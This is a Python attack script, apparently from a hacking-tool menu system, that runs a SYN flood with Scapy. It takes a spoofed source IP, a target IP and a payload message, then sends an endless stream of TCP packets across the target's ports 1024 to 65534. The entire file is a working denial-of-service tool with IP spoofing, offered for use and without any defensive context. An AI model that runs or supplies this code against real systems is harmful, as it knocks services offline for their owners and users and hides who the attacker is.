#!/usr/bin/python

from scapy.all import *
from termcolor import colored

def execute():
	os.system("clear")
	os.system("figlet -f Cyberlarge '    SYN\n FLOODER'|lolcat -a -d 1 -F 0.5")
	os.system('echo "\t  ╔──────────────────────────────────────────╗" | lolcat -a -d 1')
	os.system('echo "\t  |        Created By: Rajnish Kumar         |" | lolcat -a -d 1')
	os.system('echo "\t  ┖──────────────────────────────────────────┙\n\n" | lolcat -a -d 1')

def syn_flood(src,tgt,msg):
	for dest_port in range(1024,65535):
		IPlayer=IP(src=src, dst=tgt)
		TCPlayer=TCP(sport=4444, dport=dest_port)
		RAWlayer=Raw(load=message)
		pkt=IPlayer/TCPlayer/RAWlayer
		send(pkt)

def menu():
	option = int(input(colored("\n\nDo you want to:\n[1] Attack Again\n[2] Go Back\n[3] Main Menu\n[4] Exit\n\n>>>Select Your Choice: ",'yellow', attrs=['bold'])))
	if option == 1:
		os.system('python3 synflood.py && cd ..')

	elif option == 2:
		os.system('python3 spooferscript.py && cd ..')

	elif option == 3:
		os.system('cd .. && python3 omnitrix.py')

	elif option == 4:
		os.system('echo "Good Bye! Have A Great Day . . ."|lolcat -a -i -d 50 -F 0.5')
		exit()
	else:
		print(colored("\n[!] Error! Select Correct Option","red", attrs=['bold', 'blink']))
		input(colored("\n{|>} Press Key To Continue . . .","green"))
		os.system("clear")
		menu()

execute()
source=input(colored("|> Enter Source IP Address To Fake: ",'yellow',attrs=["bold"]))
target=input(colored("|> Enter Targets IP Address: ",'yellow',attrs=['bold']))
message=input(colored("|> Enter The Message For TCP Payload: ",'yellow',attrs=['bold']))
print("\n")
try:
		os.system('echo "STARTING FLOODING . . ."|lolcat -a -i -d 50 -F 0.5')
		while True:
			syn_flood(source,target,message)

except KeyboardInterrupt:
		print("\n")
		os.system('echo "STOPPING FLOODING . . ."|lolcat -a -i -d 50 -F 0.5')
		menu()
